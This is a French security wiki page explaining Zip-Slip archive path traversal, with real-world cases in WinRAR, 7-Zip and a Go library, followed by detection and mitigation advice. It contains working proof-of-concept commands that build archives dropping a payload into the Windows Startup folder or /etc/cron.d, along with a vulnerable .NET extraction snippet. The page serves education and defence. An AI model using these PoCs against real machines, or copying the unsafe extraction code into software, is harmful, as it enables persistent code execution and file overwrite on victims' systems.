# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Aperçu

De nombreux formats d'archive (ZIP, RAR, TAR, 7-ZIP, etc.) permettent à chaque entrée d'avoir son propre **chemin interne**. Lorsqu'un utilitaire d'extraction respecte aveuglément ce chemin, un nom de fichier malicieux contenant `..` ou un **chemin absolu** (par ex. `C:\Windows\System32\`) sera écrit en dehors du répertoire choisi par l'utilisateur.
Cette classe de vulnérabilité est largement connue sous le nom de *Zip-Slip* ou **archive extraction path traversal**.

Les conséquences vont de l'écrasement de fichiers arbitraires à l'obtention directe d'une **remote code execution (RCE)** en déposant un payload dans un emplacement **auto-run** tel que le dossier Windows *Startup*.

## Cause racine

1. L'attaquant crée une archive où un ou plusieurs en-têtes de fichier contiennent :
* Des séquences de traversée relative (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Des chemins absolus (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Ou des **symlinks** trafiqués qui résolvent en dehors du répertoire cible (courant pour ZIP/TAR sur *nix*).
2. La victime extrait l'archive avec un outil vulnérable qui fait confiance au chemin intégré (ou suit les symlinks) au lieu de le nettoyer ou d'obliger l'extraction sous le répertoire choisi.
3. Le fichier est écrit à l'emplacement contrôlé par l'attaquant et est exécuté/chargé la prochaine fois que le système ou l'utilisateur déclenche ce chemin.

### .NET `Path.Combine` + `ZipArchive` traversal

Un anti-pattern courant en .NET consiste à combiner la destination prévue avec la `ZipArchiveEntry.FullName` **contrôlée par l'utilisateur** et à extraire sans normalisation du chemin :
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Si `entry.FullName` commence par `..\\`, il traverse les répertoires ; si c'est un **absolute path** la composante de gauche est entièrement ignorée, aboutissant à un **arbitrary file write** en tant que extraction identity.
- Archive de preuve de concept pour écrire dans le répertoire adjacent `app` surveillé par un scanner planifié :
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Déposer ce ZIP dans la boîte de réception surveillée entraîne la création de `C:\samples\app\0xdf.txt`, prouvant qu'une traversée de chemin s'est produite en dehors de `C:\samples\queue\` et permettant des primitives ultérieures (p.ex., DLL hijacks).

## Exemple réel – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR pour Windows (y compris le CLI `rar` / `unrar`, la DLL et le code source portable) ne validait pas les noms de fichiers lors de l'extraction.
Une archive RAR malveillante contenant une entrée telle que :
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
se retrouverait **en dehors** du répertoire de sortie sélectionné et dans le dossier *Startup* de l'utilisateur. Après la connexion, Windows exécute automatiquement tout ce qui s'y trouve, fournissant une RCE *persistante*.

### Création d'une archive PoC (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options utilisées:
* `-ep`  – stocke les chemins de fichiers exactement tels quels (ne pas supprimer le préfixe `./`).

Livrez `evil.rar` à la victime et demandez-lui d'extraire l'archive avec une version vulnérable de WinRAR.

### Observed Exploitation in the Wild

ESET a signalé des campagnes de spear-phishing RomCom (Storm-0978/UNC2596) qui joignaient des archives RAR abusant de CVE-2025-8088 pour déployer des backdoors personnalisés et faciliter des opérations de ransomware.

## Cas récents (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug** : ZIP entries that are **symbolic links** were dereferenced during extraction, letting attackers escape the destination directory and overwrite arbitrary paths. User interaction is just *opening/extracting* the archive.
* **Affecté** : 7-Zip 21.02–24.09 (Windows & Linux builds). Corrigé dans **25.00** (juillet 2025) et versions ultérieures.
* **Impact** : Écraser `Start Menu/Programs/Startup` ou des emplacements exécutés par des services → le code s'exécute à la prochaine ouverture de session ou au redémarrage du service.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Sur une build corrigée `/etc/cron.d` ne sera pas touché ; le symlink est extrait comme un lien à l'intérieur de /tmp/target.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug** : `archiver.Unarchive()` suit les entrées ZIP contenant `../` et les entrées symlink, écrivant en dehors de `outputDir`.
* **Affecté** : `github.com/mholt/archiver` ≤ 3.5.1 (projet désormais déprécié).
* **Correction** : Passez à `mholt/archives` ≥ 0.1.0 ou implémentez des vérifications de chemin canonique avant l'écriture.
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Conseils de détection

* **Inspection statique** – Lister les entrées de l'archive et signaler tout nom contenant `../`, `..\\`, *chemins absolus* (`/`, `C:`) ou des entrées de type *symlink* dont la cible est en dehors du répertoire d'extraction.
* **Canonicalisation** – Vérifier que `realpath(join(dest, name))` commence toujours par `dest`. Rejeter sinon.
* **Extraction en bac à sable** – Décompressez dans un répertoire jetable en utilisant un extracteur *sûr* (par ex. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) et vérifiez que les chemins résultants restent à l'intérieur du répertoire.
* **Surveillance des endpoints** – Alerter sur l'apparition de nouveaux exécutables écrits dans les emplacements `Startup`/`Run`/`cron` peu après l'ouverture d'une archive par WinRAR/7-Zip/etc.

## Atténuation & durcissement

1. **Mettre à jour l'extracteur** – WinRAR 7.13+ et 7-Zip 25.00+ implémentent la sanitisation des chemins/symlink. Les deux outils manquent encore de mise à jour automatique.
2. Extraire les archives avec « **Do not extract paths** » / « **Ignore paths** » quand c'est possible.
3. Sous Unix, baisser les privilèges & monter un **chroot/namespace** avant l'extraction ; sous Windows, utiliser **AppContainer** ou un sandbox.
4. Si vous écrivez du code personnalisé, normalisez avec `realpath()`/`PathCanonicalize()` **avant** de créer/écrire, et rejetez toute entrée qui s'échappe du répertoire de destination.

## Autres cas affectés / historiques

* 2018 – Massive *Zip-Slip* advisory by Snyk affecting many Java/Go/JS libraries.
* 2023 – 7-Zip CVE-2023-4011 similar traversal during `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).
* Toute logique d'extraction personnalisée qui n'appelle pas `PathCanonicalize` / `realpath` avant l'écriture.

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
